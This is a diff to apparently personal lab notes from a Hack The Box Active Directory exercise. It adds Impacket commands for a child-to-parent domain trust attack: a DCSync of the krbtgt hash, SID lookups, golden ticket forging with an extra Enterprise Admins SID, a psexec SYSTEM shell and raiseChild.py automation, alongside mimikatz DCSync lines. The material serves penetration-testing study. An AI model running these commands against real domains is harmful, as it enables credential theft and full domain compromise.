@@ -78,7 +78,7 @@ bloodhound
 ```powershell
 mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt"
 ```
-2) **Using Get-DomainSID**
+2) **Get child Domain SID**
 ```powershell
 Get-DomainSID
 ```
@@ -103,4 +103,45 @@ klist
 6) Performing a DCSync Attack against parent domain then we can forge golden ticket
 ```
 .\mimikatz.exe "lsadump::dcsync" "/domain:INLANEFREIGHT.LOCAL" "/user:INLANEFREIGHT\lab_adm"
+```
+
+### Linux
+1) **Obtaining the KRBTGT**
+```shell
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+```
+2) **Get child Domain SID**
+
+```shell
+# from Impacket toolkit
+# the ip of the DC of child domain 
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+```
+3) **Obtaining Enterprise Admins Group's SID**
+```shell
+# from Impacket toolkit
+# the ip of the DC of the parent DC
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+```
+4) **Creating a Golden Ticket**
+```shell
+# from Impacket toolkit
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+# The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials.
+export KRB5CCNAME=hacker.ccache 
+```
+5) **Getting a SYSTEM shell**
+```shell
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+```
+
+#### we can use on tool to automate the proccess
+**using raiseChild.py**
+
+```shell
+# from Impacket toolkit
+# the ip of parent DC then the child domain user
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
